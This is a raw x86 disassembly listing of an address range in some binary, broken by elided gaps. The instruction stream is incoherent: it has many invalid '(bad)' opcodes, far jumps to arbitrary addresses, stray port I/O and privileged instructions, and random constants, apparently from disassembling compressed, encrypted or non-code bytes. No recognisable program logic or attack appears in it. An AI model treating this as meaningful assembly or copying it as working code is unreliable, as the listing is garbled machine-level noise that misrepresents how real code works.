  426e14:	cdq    
  426e15:	xor    bh,BYTE PTR [edx]
  426e17:	xor    al,0xc8
  426e19:	ret    
  426e1a:	mov    ebp,DWORD PTR [ebx+0x5]
  426e1d:	call   0x9cfb:0xe11e74b2
  426e24:	push   esp
  426e25:	inc    eax
  426e26:	fs xchg esi,eax
  426e28:	imul   esp,ebp,0xaee16c29
  426e2e:	lahf   
  426e2f:	push   edx
  426e30:	fcom   DWORD PTR [ecx-0x60]
  426e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e34:	imul   esp,DWORD PTR [edi-0x1a],0x62
  426e38:	push   edx
  426e39:	mov    ah,0x77
  426e3b:	sub    cl,bl
  426e3d:	add    eax,DWORD PTR [edi+0x63]
  426e40:	cli    
  426e41:	lods   eax,DWORD PTR ds:[esi]
  426e42:	dec    edx
  426e43:	push   eax
  426e44:	mov    ebp,0xe70e5b5d
  426e49:	adc    DWORD PTR [ebp-0x47],edi
  426e4c:	inc    ebp
  426e4d:	and    DWORD PTR ds:0xe4fbe8d0,eax
  426e53:	cli    
  426e54:	push   DWORD PTR [edi+0x7a]
  426e57:	xchg   ebp,eax
  426e58:	cli    
  426e59:	jmp    0x4f5e:0xa2e8acd9
  426e60:	add    esp,DWORD PTR [eax-0x1a]
  426e63:	pop    es
  426e64:	dec    ecx
  426e65:	es fcmovnu st,st(0)
  426e68:	fwait
  426e69:	ins    DWORD PTR es:[edi],dx
  426e6a:	sahf   
  426e6b:	sbb    ah,al
  426e6d:	mov    ebx,0x5d5fbf82
  426e72:	sub    BYTE PTR [ecx+ecx*2],0x10
  426e76:	mov    DWORD PTR [edx],ebx
  426e78:	add    eax,0x8f88376c
  426e7d:	ds clc 
  426e7f:	add    ebx,DWORD PTR [esi+edx*2]
  426e82:	pusha  
  426e83:	add    al,0x82
  426e85:	addr16 jp 0x426eaf
  426e88:	dec    ebp
  426e89:	mov    eax,ds:0xbc70aa1e
  426e8e:	add    al,0x9c
  426e90:	pop    esi
  426e91:	sbb    bl,0xd8
  426e94:	dec    ebp
  426e95:	pop    ecx
  426e96:	push   eax
  426e97:	sub    esi,ebx
  426e99:	fldenv [edi+0x4ee58de3]
  426e9f:	mov    ah,BYTE PTR [ebx]
  426ea1:	fisub  WORD PTR [ebx-0x13]
  426ea4:	dec    eax
  426ea5:	lods   al,BYTE PTR ds:[esi]
  426ea6:	aam    0x12
  426ea8:	into   
  426ea9:	(bad)  [ecx+0x6]
  426eac:	mov    dl,0x8d
  426eae:	xor    bh,cl
  426eb0:	inc    ecx
  426eb1:	or     BYTE PTR [ebx-0x5f],bl
  426eb4:	xor    al,0xdb
  426eb6:	aam    0x34
  426eb8:	push   ds
  426eb9:	push   0x17
  426ebb:	cs jb  0x426e8e
  426ebe:	jl     0x426ec9
  426ec0:	pop    eax
  426ec1:	stc    
  426ec2:	mov    ah,0x58
  426ec4:	and    esp,DWORD PTR [ebx+0x747d9ee4]
  426eca:	xor    edx,DWORD PTR [eax]
  426ecc:	push   eax
  426ecd:	in     al,0x67
  426ecf:	push   0x800f5cd8
  426ed4:	mov    ch,0xc9
  426ed6:	mov    bh,0xc0
  426ed8:	ja     0x426ebf
  426eda:	push   ecx
  426edb:	inc    esi
  426edc:	dec    ebx
  426edd:	inc    ebx
  426ede:	ins    BYTE PTR es:[edi],dx
  426edf:	mov    ah,0x82
  426ee1:	call   0xa4b:0x2086b2a6
  426ee8:	mov    cl,0x9b
  426eea:	add    al,0x52
  426eec:	scas   eax,DWORD PTR es:[edi]
  426eed:	jbe    0x426ed9
  426eef:	or     edi,DWORD PTR [esi+0x37]
  426ef2:	dec    ebp
  426ef3:	lock push ds
  426ef5:	mov    ds:0xe39db7f0,eax
  426efa:	xchg   ebp,eax
  426efb:	push   ss
  426efc:	out    0xeb,eax
  426efe:	fldenv fs:[edi]
  426f01:	cmp    BYTE PTR [esi],ah
  426f03:	push   esp
  426f04:	sbb    DWORD PTR [edx+ecx*8-0x2dc0781b],esi
  426f0b:	cmp    ah,BYTE PTR [ecx-0x43]
  426f0e:	add    esp,DWORD PTR [edi]
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+ecx*4+0x85a47ac],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	xchg   BYTE PTR [esi+0x68],ch
  426f8f:	fistp  WORD PTR [ebx+ebp*4-0x2]
  426f93:	push   edx
  426f94:	popa   
  426f95:	les    ebx,FWORD PTR [edi]
  426f97:	in     al,0x5e
  426f99:	stc    
  426f9a:	adc    eax,0xb5a82011
  426f9f:	mov    edx,0xfcad215
  426fa4:	clc    
  426fa5:	push   edi
  426fa6:	pop    eax
  426fa7:	in     al,0xf6
  426fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426faa:	jmp    0x426ff0
  426fac:	add    eax,0xb48de274
  426fb1:	sbb    edi,DWORD PTR [edx-0x3c]
  426fb4:	call   0x647f:0x25d94b11
  426fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fbc:	mov    eax,ds:0xa3c44ae7
  426fc1:	mov    al,ds:0xcca38034
  426fc6:	mov    esp,0xd2906978
  426fcb:	sahf   
  426fcc:	pop    edi
  426fcd:	dec    BYTE PTR [edi-0x48]
  426fd0:	fwait
  426fd1:	ins    BYTE PTR es:[edi],dx
  426fd2:	sub    dh,dl
  426fd4:	or     eax,0x680b191
  426fd9:	iret   
  426fda:	jle    0x427049
  426fdc:	lods   eax,DWORD PTR ds:[esi]
  426fdd:	lahf   
  426fde:	scas   eax,DWORD PTR es:[edi]
  426fdf:	add    dl,al
  426fe1:	(bad)  
  426fe2:	lock xchg esp,eax
  426fe4:	scas   al,BYTE PTR es:[edi]
  426fe5:	jbe    0x426f7d
  426fe7:	jb     0x426fe9
  426fe9:	sub    dh,BYTE PTR [ecx+ebx*8+0x59887907]
  426ff0:	dec    ebx
  426ff1:	or     al,0xd7
  426ff3:	add    ebx,ecx
  426ff5:	cs push cs
  426ff7:	icebp  
  426ff8:	jo     0x427051
  426ffa:	jg     0x427067
  426ffc:	mov    ds:0xfa8ad544,eax
  427001:	xchg   ebp,eax
  427002:	(bad)  
  427003:	(bad)  
  427004:	pushf  
  427005:	ror    BYTE PTR [ebp-0x7d],0x43
  427009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42700a:	dec    ebx
  42700b:	mov    al,0x9c
  42700d:	je     0x427032
  42700f:	adc    al,0xb9
  427011:	popf   
  427012:	nop
  427013:	pop    eax
  427014:	lds    edi,FWORD PTR [ebx]
  427016:	add    eax,0x38fc75fa
  42701b:	push   0x7f
  42701d:	pop    esp
  42701e:	xor    BYTE PTR [esi+0x143419ee],ch
  427024:	dec    edi
  427025:	xor    DWORD PTR [esp+ecx*4],esp
  427028:	cmp    esp,eax
  42702a:	push   ebp
  42702b:	push   ss
  42702c:	leave  
  42702d:	push   ss
  42702e:	scas   al,BYTE PTR es:[edi]
  42702f:	xlat   BYTE PTR ds:[ebx]
  427030:	xchg   esi,eax
  427031:	push   es
  427032:	repnz or edi,edi
  427035:	imul   edx,DWORD PTR [ebp+0xb],0x5e
  427039:	cmp    BYTE PTR [edx+ecx*8-0x55],al
  42703d:	(bad)  
  42703e:	jmp    0x4270b6
  427040:	retf   
  427041:	fsubr  st,st(0)
  427043:	xlat   BYTE PTR ds:[ebx]
  427044:	inc    edi
  427045:	add    ah,bl
  427047:	and    al,0x33
  427049:	out    dx,al
  42704a:	loop   0x4270c5
  42704c:	dec    eax
  42704d:	test   al,0x9f
  42704f:	imul   edx,DWORD PTR [esi+0x1a],0xffffff81
  427053:	lds    edx,FWORD PTR [ebp-0x15]
  427056:	dec    edx
  427057:	jo     0x426ff8
  427059:	popa   
  42705a:	jle    0x42706b
  42705c:	gs leave 
  42705e:	xchg   ebp,eax
  42705f:	mov    al,0xb4
  427061:	pushf  
  427062:	out    dx,al
  427063:	dec    ecx
  427064:	test   DWORD PTR [ebp-0x334a7038],edx
  42706a:	retf   
  42706b:	jmp    0x4270a2
  42706d:	adc    BYTE PTR [eax+0x5a5c0707],dh
  427073:	jge    0x4270e0
  427075:	aas    
  427076:	fisubr WORD PTR [ebx-0x6e]
  427079:	iret   
  42707a:	ss retf 
  42707c:	sub    ebp,DWORD PTR [ecx]
  42707e:	aam    0x26
  427080:	add    eax,0xffffffd5
  427083:	into   
  427084:	mov    dh,0x96
  427086:	cmp    al,0xb8
  427088:	test   al,0x9d
  42708a:	test   DWORD PTR [ecx-0x6a],0x9e785f
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x61e49d96
  427102:	push   esi
  427103:	aas    
  427104:	or     al,0xa1
  427106:	add    DWORD PTR [eax],eax
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42710d:	push   es
  42710e:	or     edi,DWORD PTR [edx-0x6910e955]
  427114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427115:	sub    BYTE PTR [esi+0x26],dl
  427118:	pop    edx
  427119:	jnp    0x4270bb
  42711b:	push   ss
  42711c:	fstp   DWORD PTR [esi]
  42711e:	out    0x94,eax
  427120:	addr16 out 0xb,al
  427123:	es loop 0x427151
  427126:	bound  esp,QWORD PTR [ecx-0x4e017d4a]
  42712c:	pushf  
  42712d:	leave  
  42712e:	ds clc 
  427130:	ss pop es
  427132:	out    0xb4,eax
  427134:	push   edx
  427135:	xchg   edx,eax
  427136:	test   DWORD PTR [ebp+0x66],esp
  427139:	xchg   esi,eax
  42713a:	pusha  
  42713b:	jmp    0x4270c1
  42713d:	pop    es
  42713e:	test   ebx,0x59a9979a
  427144:	pop    es
  427145:	pop    esi
  427146:	ds pop ecx
  427148:	or     DWORD PTR [ebx-0x7fbb1851],0x3ccd21b7
  427152:	or     DWORD PTR [ecx+0x5f],esi
  427155:	in     al,0x69
  427157:	mov    dh,0x40
  427159:	retf   
  42715a:	or     al,0x7a
  42715c:	pop    ebx
  42715d:	push   ebp
  42715e:	inc    ebp
  42715f:	hlt    
  427160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427161:	push   0x26a6b6a
  427166:	and    al,0x1f
  427168:	test   DWORD PTR [eax-0x56],esp
  42716b:	jecxz  0x42718e
  42716d:	mov    al,ds:0x2095acb5
  427172:	pmullw mm0,QWORD PTR [esi]
  427175:	fsubr  st,st(1)
  427177:	fist   WORD PTR [edx+0xd]
  42717a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42717b:	in     eax,0x6a
  42717d:	xchg   DWORD PTR [eax-0x5ab41474],ebp
  427183:	push   0x5d62926a
  427188:	and    al,0xf7
  42718a:	jg     0x427112
  42718c:	and    ebp,DWORD PTR [edi+0x6a]
  42718f:	jle    0x427169
  427191:	push   cs
  427192:	gs xchg edx,eax
  427194:	sbb    al,0x32
  427196:	or     eax,0xe3c1d007
  42719b:	fsub   st,st(6)
  42719d:	aad    0xbf
  42719f:	std    
  4271a0:	test   BYTE PTR [ecx],bl
  4271a2:	popa   
  4271a3:	jecxz  0x4271d2
  4271a5:	idiv   BYTE PTR [ecx-0x19]
  4271a8:	out    dx,eax
  4271a9:	je     0x4271e0
  4271ab:	xchg   esi,eax
  4271ac:	jo     0x4271d9
  4271ae:	fst    DWORD PTR [eax-0x56296149]
  4271b4:	rcl    BYTE PTR [esi-0x2a],1
  4271b7:	fidivr DWORD PTR [ecx+0x2db50347]
  4271bd:	fwait
  4271be:	or     eax,ebx
  4271c0:	ins    DWORD PTR es:[edi],dx
  4271c1:	sbb    bl,BYTE PTR [edx]
  4271c3:	outs   dx,BYTE PTR ds:[esi]
  4271c4:	dec    edx
  4271c5:	push   es
  4271c6:	int3   
  4271c7:	xchg   DWORD PTR es:[edx+0x40995629],ecx
  4271ce:	sbb    al,0xaf
  4271d0:	cdq    
  4271d1:	out    dx,eax
  4271d2:	mov    al,ds:0xaa420552
  4271d7:	jmp    FWORD PTR [ebp+edx*1+0x61]
  4271db:	lea    esi,[ecx+ecx*2-0x545397c9]
  4271e2:	sub    esi,DWORD PTR [esp+edi*2]
  4271e5:	in     eax,0x88
  4271e7:	ds retf 0xf8bb
  4271eb:	dec    edi
  4271ec:	add    al,0x2f
  4271ee:	push   esp
  4271ef:	test   al,0x59
  4271f1:	aaa    
  4271f2:	jg     0x42719c
  4271f4:	(bad)  
  4271f5:	dec    edi
  4271f6:	sbb    al,0x21
  4271f8:	rcl    DWORD PTR [edi+0x3b],0x14
  4271fc:	and    ch,al
  4271fe:	xchg   esi,eax
  4271ff:	mov    es,WORD PTR [ebp-0x4d]
  427202:	ret    
  427203:	sub    dl,dl
  427205:	data16 je 0x42724c
  427208:	test   BYTE PTR [edi+0x42],dl
  42720b:	push   0xbb2ed8ae
	...
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xbba6f1a7,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	mov    esi,0xb725c09b
  427291:	lea    ebp,[edx]
  427293:	pop    eax
  427294:	ins    BYTE PTR es:[edi],dx
  427295:	sbb    eax,0xbdef0e5a
  42729a:	dec    eax
  42729b:	mov    WORD PTR [ebx+0xbb3b1cf],ds
  4272a1:	or     DWORD PTR [ecx],edx
  4272a3:	retf   0x1759
  4272a6:	adc    BYTE PTR [esi],bh
  4272a8:	mov    edi,0xda90b56f
  4272ad:	cli    
  4272ae:	sbb    eax,0x4676c00f
  4272b3:	mov    al,0x82
  4272b5:	mov    edi,0x4463edb5
  4272ba:	repnz pop eax
  4272bc:	scas   al,BYTE PTR es:[edi]
  4272bd:	xchg   DWORD PTR [esi+edx*2-0x69],edx
  4272c1:	repz inc esp
  4272c3:	push   eax
  4272c4:	(bad)  
  4272c6:	fs out 0x85,eax
  4272c9:	pop    ebx
  4272ca:	scas   al,BYTE PTR es:[edi]
  4272cb:	mov    ecx,0x29869a07
  4272d0:	mov    ebp,esi
  4272d2:	outs   dx,BYTE PTR ds:[esi]
  4272d3:	inc    edx
  4272d4:	sub    eax,0x89920ad8
  4272d9:	(bad)  
  4272da:	sar    BYTE PTR [edi],0x14
  4272dd:	mov    ah,0x70
  4272df:	cs mov ecx,0xd78436ac
  4272e5:	out    dx,al
  4272e6:	mov    edx,0x16a595ba
  4272eb:	jl     0x4272b8
  4272ed:	scas   al,BYTE PTR es:[edi]
  4272ee:	adc    BYTE PTR [ebp+0x17904a20],0xf4
  4272f5:	sbb    BYTE PTR [ecx-0x7b],bh
  4272f8:	jae    0x42733c
  4272fa:	and    bh,ch
  4272fc:	adc    edx,eax
  4272fe:	cmp    dh,bh
  427300:	xchg   esi,eax
  427301:	ins    DWORD PTR es:[edi],dx
  427302:	int3   
  427303:	jno    0x42731a
  427305:	out    dx,al
  427306:	mov    bh,0xc9
  427308:	lds    edx,FWORD PTR [esi+0x58]
  42730b:	pusha  
  42730c:	fldcw  WORD PTR [esi+eax*1]
  42730f:	xchg   DWORD PTR [ebp+eax*8-0x893fe02],edx
  427316:	stos   BYTE PTR es:[edi],al
  427317:	sar    BYTE PTR [ebx-0x78],cl
  42731a:	xor    dl,BYTE PTR [edx+0x498820ea]
  427320:	jb     0x4272b8
  427322:	pop    esi
  427323:	gs lods al,BYTE PTR cs:[esi]
  427326:	push   esp
  427327:	mov    esi,0xe497ee01
  42732c:	aaa    
  42732d:	loop   0x42736c
  42732f:	mov    ebx,0x8ea55a58
  427334:	lock test esi,esi
  427337:	mov    al,ds:0x2243c46c
  42733c:	jnp    0x4272f9
  42733e:	mov    ds:0xcf741f3c,al
  427343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427344:	mov    ah,0xc2
  427346:	push   edi
  427347:	push   ebp
  427348:	or     esp,edi
  42734a:	pop    ebp
  42734b:	mov    ebx,0x82cddbb2
  427350:	lods   eax,DWORD PTR ds:[esi]
  427351:	push   es
  427352:	lods   eax,DWORD PTR ds:[esi]
  427353:	rcl    BYTE PTR [esp+eax*1+0x53871b49],cl
  42735a:	or     bl,BYTE PTR [esi]
  42735c:	push   ds
  42735d:	jmp    0x945b6351
  427362:	add    ah,BYTE PTR [ecx]
  427364:	call   0xd5c1:0xa5e5b8e4
  42736b:	fmul   QWORD PTR [esp+ebp*1-0x72ccef05]
  427372:	and    al,0x36
  427374:	test   eax,0xdf47e38
  427379:	mov    ecx,0x740d67c3
  42737e:	pop    eax
  42737f:	jmp    0xa8023493
  427384:	mov    eax,ds:0xa60b99fe
  427389:	lahf   
  42738a:	dec    edx
  42738b:	std    
  42738c:	sub    al,0x58
  42738e:	cmc    
  42738f:	or     al,BYTE PTR [eax]
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    eax,ebx
  427401:	js     0x427383
  427403:	add    DWORD PTR [ebx+eiz*4],edx
  427406:	add    DWORD PTR [eax],eax
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	cmp    bl,al
  42740e:	dec    ecx
  42740f:	and    bl,cl
  427411:	jbe    0x42744a
  427413:	xor    BYTE PTR [edx-0x520c4678],dh
  427419:	cmp    eax,0xbbb1f583
  42741e:	push   ecx
  42741f:	ror    BYTE PTR [eax+0x4af555fd],1
  427425:	mov    cl,BYTE PTR [edi]
  427427:	cmp    edi,DWORD PTR [edi-0x48e83354]
  42742d:	xlat   BYTE PTR ds:[ebx]
  42742e:	pop    ss
  42742f:	xchg   BYTE PTR [ecx],cl
  427431:	dec    esi
  427432:	jl     0x427450
  427434:	in     eax,0x2a
  427436:	bound  ebx,QWORD PTR [esi+0x52]
  427439:	or     bl,BYTE PTR [esi-0x1edf2fa5]
  42743f:	aaa    
  427440:	and    ecx,DWORD PTR [edx]
  427442:	aam    0x34
  427444:	iret   
  427445:	out    0x7e,eax
  427447:	xor    dl,BYTE PTR [esi]
  427449:	ss je  0x427407
  42744c:	adc    DWORD PTR [eax-0x4],0xa
  427450:	pop    edx
  427451:	call   0xb1b1af2b
  427456:	in     al,dx
  427457:	inc    esp
  427458:	add    eax,0x5937b7b3
  42745d:	adc    edx,DWORD PTR [ecx+0x33]
  427460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427461:	stc    
  427462:	pop    ds
  427463:	ds jae 0x4274c4
  427466:	mov    dl,0xde
  427468:	xor    DWORD PTR [eax],ebx
  42746a:	mov    bh,0x6d
  42746c:	jne    0x427414
  42746e:	mov    ds:0xf5a3ea36,al
  427474:	in     eax,0x41
  427476:	xchg   ecx,eax
  427477:	addr16 loope 0x427444
  42747a:	mov    ds,WORD PTR [edx-0x288a5e06]
  427480:	mov    edx,0x70e75bf7
  427485:	ss out 0xc5,al
  427488:	mov    bh,0xb4
  42748a:	fisubr DWORD PTR [ebx-0x6e]
  42748d:	jns    0x427459
  42748f:	ss inc edx
  427491:	ja     0x42745b
  427493:	loopne 0x427445
  427495:	retf   0xea10
  427498:	jbe    0x4274a5
  42749a:	or     eax,0xa3b45fa2
  42749f:	xchg   edi,eax
  4274a0:	and    DWORD PTR [edi-0x42aa7fc],0x7e2bd916
  4274aa:	(bad)  
  4274ab:	imul   BYTE PTR [eax]
  4274ad:	fld    DWORD PTR [ecx]
  4274af:	jge    0x427510
  4274b1:	les    sp,DWORD PTR [ebx]
  4274b4:	in     eax,dx
  4274b5:	mov    BYTE PTR [esi],bl
  4274b7:	sub    DWORD PTR [edi],ebx
  4274b9:	inc    ecx
  4274ba:	inc    esp
  4274bb:	pop    ecx
  4274bc:	mov    eax,0x5c6fd658
  4274c1:	lock leave 
  4274c3:	leave  
  4274c4:	pop    ds
  4274c5:	xchg   DWORD PTR [ecx],ecx
  4274c7:	pusha  
  4274c8:	or     BYTE PTR [esi+0x70],al
  4274cb:	jmp    FWORD PTR [esi-0x29]
  4274ce:	dec    edx
  4274cf:	xor    al,BYTE PTR [ecx+0x4d]
  4274d2:	mov    WORD PTR [ebx+0x4f],fs
  4274d5:	adc    dl,BYTE PTR [edx+0x72bcae6b]
  4274db:	add    BYTE PTR [ecx+0x4421ba36],ch
  4274e1:	add    esp,DWORD PTR [ecx+edi*1+0x1b]
  4274e5:	fisub  DWORD PTR [edx+eiz*8+0x2e]
  4274e9:	jecxz  0x427515
  4274eb:	loope  0x427567
  4274ed:	cmp    DWORD PTR [edi-0x65317fcf],edi
  4274f3:	sti    
  4274f4:	retf   0x358b
  4274f7:	into   
  4274f8:	mov    DWORD PTR [esi+0x7213cdb5],ebp
  4274fe:	in     al,0x80
  427500:	std    
  427501:	iret   
  427502:	jb     0x4274f2
  427504:	stc    
  427505:	retf   
  427506:	push   ds
  427507:	jle    0x42757c
  427509:	and    ebx,edi
  42750b:	adc    eax,eax
  42750d:	sahf   
  42750e:	gs mov ah,0x0
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	cld    
  427581:	pusha  
  427582:	inc    ebx
  427583:	fcomp  QWORD PTR [eax]
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	leave  
  42758d:	in     al,dx
  42758e:	test   DWORD PTR [ebp-0x60041d6f],ebx
  427594:	into   
  427595:	push   eax
  427596:	jbe    0x42756f
  427598:	cs daa 
  42759a:	fild   QWORD PTR [ebx+0x75]
  42759d:	in     eax,0xf7
  42759f:	cmp    ebp,ebx
  4275a1:	imul   eax,esi,0xaca5dc45
  4275a7:	in     eax,dx
  4275a8:	add    BYTE PTR [eax],dl
  4275aa:	retf   0x88d2
  4275ad:	sub    DWORD PTR [edi],edx
  4275af:	xchg   esi,eax
  4275b0:	pop    eax
  4275b1:	test   DWORD PTR [esi+0xa],esi
  4275b4:	push   ebp
  4275b5:	pop    ds
  4275b6:	sahf   
  4275b7:	mov    bl,BYTE PTR [eax]
  4275b9:	mov    al,ds:0xac7064e5
  4275be:	mov    ecx,0x81dbc551
  4275c3:	mov    ss,WORD PTR [edx]
  4275c5:	shl    BYTE PTR [edi-0x76],cl
  4275c8:	pop    ebx
  4275c9:	mov    esp,0x75d4e885
  4275ce:	pop    edx
  4275cf:	jne    0x427597
  4275d1:	ins    DWORD PTR es:[edi],dx
  4275d2:	(bad)  
  4275d3:	adc    al,0x3c
  4275d5:	aaa    
  4275d6:	inc    eax
  4275d7:	bound  esi,QWORD PTR [edi+0x5556ea54]
  4275dd:	xchg   edx,eax
  4275de:	jmp    0xddbb:0x530c16e5
  4275e5:	iret   
  4275e6:	ss sbb al,0xce
  4275e9:	fwait
  4275ea:	test   BYTE PTR [ecx],ah
  4275ec:	inc    eax
  4275ed:	leave  
  4275ee:	in     eax,0xc9
  4275f0:	fdiv   st(2),st
  4275f2:	add    DWORD PTR [esi],esi
  4275f4:	test   BYTE PTR [edi-0xb0b729b],ch
  4275fa:	pop    eax
  4275fb:	dec    esi
  4275fc:	sbb    eax,0x2a1c86bf
  427601:	mov    esi,0x39c9f749
  427606:	mov    bl,0xff
  427608:	or     esp,ebx
  42760a:	and    eax,0x36961688
  42760f:	test   DWORD PTR [ebx+0x38b24c6b],esp
  427615:	jle    0x4275c6
  427617:	sub    DWORD PTR [ecx],edx
  427619:	out    0x57,al
  42761b:	adc    DWORD PTR [esi-0x7b],esi
  42761e:	pop    eax
  42761f:	add    al,0xb7
  427621:	xchg   ebx,eax
  427622:	sbb    ch,BYTE PTR [esi+0x4e8c9ad6]
  427628:	fidiv  DWORD PTR [eax]
  42762a:	inc    ebp
  42762b:	gs out 0x7a,al
  42762e:	push   ecx
  42762f:	lahf   
  427630:	out    dx,eax
  427631:	mov    esi,0x7cc1c050
  427636:	dec    esp
  427637:	ret    
  427638:	add    DWORD PTR [ebx+0x4f2f6cd7],eax
  42763e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42763f:	push   ss
  427640:	sbb    BYTE PTR [edx+0x6f7b1332],bl
  427646:	xchg   esp,eax
  427647:	retf   0xec07
  42764a:	cmp    eax,0x793eff23
  42764f:	imul   ebx,DWORD PTR [esp+ebx*4],0xc76b42d0
  427656:	adc    BYTE PTR [edx],ah
  427658:	jnp    0x427609
  42765a:	and    DWORD PTR [ecx],0x927bacad
  427660:	add    al,0xa0
  427662:	sub    BYTE PTR es:[edi-0x6a],dl
  427666:	adc    eax,DWORD PTR [edx]
  427668:	mov    ds:0xaddc569d,eax
  42766d:	shl    BYTE PTR [ebx+esi*1-0x39ba30e4],0x8d
  427675:	in     eax,dx
  427676:	or     BYTE PTR [edx],dh
  427678:	fsubr  st,st(0)
  42767a:	adc    bl,ah
  42767c:	mov    ebp,0x679080ab
  427681:	sub    eax,0xafbe8a05
  427686:	jbe    0x427695
  427688:	imul   edx,DWORD PTR [ecx+edx*8-0x427f2255],0xffffff9b
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstcw WORD PTR [edi]
  427701:	mov    bl,0xf0
  427703:	pop    es
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	cmp    ebp,ebp
  42770e:	sahf   
  42770f:	out    dx,al
  427710:	jp     0x4276c1
  427712:	mov    al,ds:0xe3ee0a31
  427717:	les    esp,FWORD PTR [esi-0x51a0e678]
  42771d:	stc    
  42771e:	arpl   si,dx
  427720:	fnstsw WORD PTR [edi+0x5c]
  427723:	xchg   edi,eax
  427724:	stos   BYTE PTR es:[edi],al
  427725:	neg    DWORD PTR [ebx]
  427727:	test   BYTE PTR [edx],bh
  427729:	xor    DWORD PTR [esi],ecx
  42772b:	pop    esi
  42772c:	cmc    
  42772d:	sbb    eax,0xe89e046b
  427732:	nop
  427733:	inc    esi
  427734:	js     0x4276c6
  427736:	and    esp,DWORD PTR [edx-0x4d]
  427739:	inc    ecx
  42773a:	inc    eax
  42773b:	inc    edx
  42773d:	icebp  
  42773e:	sub    DWORD PTR [edx+0x4d],esp
  427741:	lahf   
  427742:	inc    esp
  427743:	xor    eax,0x594881e6
  427748:	dec    ebx
  427749:	dec    esp
  42774a:	imul   ecx,DWORD PTR [esi+0x22038ad0],0x24
  427751:	lahf   
  427752:	lods   eax,DWORD PTR ds:[esi]
  427753:	jno    0x4277b9
  427755:	lods   al,BYTE PTR ds:[esi]
  427756:	jne    0x4276e6
  427758:	(bad)  
  427759:	cmc    
  42775a:	enter  0x36cf,0x9a
  42775e:	test   eax,0x79f43227
  427763:	das    
  427764:	gs jl  0x42771c
  427767:	mov    dh,0xce
  427769:	iret   
  42776a:	jb     0x4277be
  42776c:	jg     0x427700
  42776e:	iret   
  42776f:	fld    TBYTE PTR [esi]
  427771:	int3   
  427772:	mov    ds:0xa5a1bc60,al
  427777:	sub    eax,0x2cf7190a
  42777c:	fiadd  WORD PTR [ebx]
  42777e:	and    BYTE PTR ds:0xc45036a9,dl
  427784:	inc    ebx
  427785:	or     bl,BYTE PTR ds:0x40f61054
  42778b:	not    BYTE PTR [edx-0x5f]
  42778e:	jecxz  0x42775b
  427790:	sub    bl,BYTE PTR [edx+0x13]
  427793:	xchg   esi,eax
  427794:	mov    bl,0x45
  427796:	xor    al,0xee
  427798:	aas    
  427799:	mov    ebx,0x6e59156f
  42779e:	test   eax,0xe4f5775
  4277a3:	mov    DWORD PTR [ecx],esp
  4277a5:	test   BYTE PTR [eax+edx*2+0x788e8fa2],cl
  4277ac:	push   esp
  4277ad:	lock push ecx
  4277af:	in     eax,0x53
  4277b1:	mov    es,ecx
  4277b3:	jge    0x427782
  4277b5:	out    0x77,al
  4277b7:	(bad)  
  4277b8:	push   esi
  4277b9:	xchg   ebx,eax
  4277ba:	xlat   BYTE PTR ds:[ebx]
  4277bb:	pop    ecx
  4277bc:	imul   esi,DWORD PTR [edx],0xffffff94
  4277bf:	xchg   DWORD PTR [edx],ebp
  4277c1:	push   edi
  4277c2:	test   BYTE PTR [ecx+0x5],0x11
  4277c6:	push   ecx
  4277c7:	sti    
  4277c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277c9:	mov    eax,ds:0x9493c54a
  4277ce:	stos   DWORD PTR es:[edi],eax
  4277cf:	or     BYTE PTR [edi-0x2c1a5607],dh
  4277d5:	jbe    0x4277f4
  4277d7:	test   BYTE PTR [ecx-0x66],0xc
  4277db:	leave  
  4277dc:	jnp    0x42785c
  4277de:	pop    ds
  4277df:	adc    al,BYTE PTR ds:0x6f0eb8ee
  4277e5:	adc    dl,dl
  4277e7:	mov    ebp,0x1dfa5641
  4277ec:	mov    bh,0xa6
  4277ee:	inc    edx
  4277ef:	dec    edx
